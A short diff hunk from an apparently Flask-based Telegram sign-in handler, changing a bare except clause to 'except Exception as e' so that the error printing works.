@@ -95,7 +95,7 @@ def send(login_code, phone):
                 return redirect(url_for("password", phone=phone))
         client.disconnect()
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
-    except:
+    except Exception as e:
         print(e)
         return redirect(url_for('login'))
 
